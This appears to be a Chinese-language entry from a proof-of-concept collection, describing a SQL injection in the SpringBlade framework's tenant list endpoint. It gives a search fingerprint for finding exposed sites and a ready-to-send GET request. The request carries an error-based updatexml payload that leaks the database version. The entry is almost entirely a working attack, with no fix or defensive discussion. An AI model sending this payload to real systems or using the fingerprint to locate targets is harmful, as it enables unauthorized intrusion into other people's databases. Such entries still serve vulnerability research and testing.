# SpringBladetenantlistSQL注入漏洞

SpringBladetenantlistSQL ｜ SQL注入 ｜ —
- **指纹**：`body="https://bladex.vip/"`
- **请求**：`GET /api/blade-system/tenant/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1 HTTP/1.1`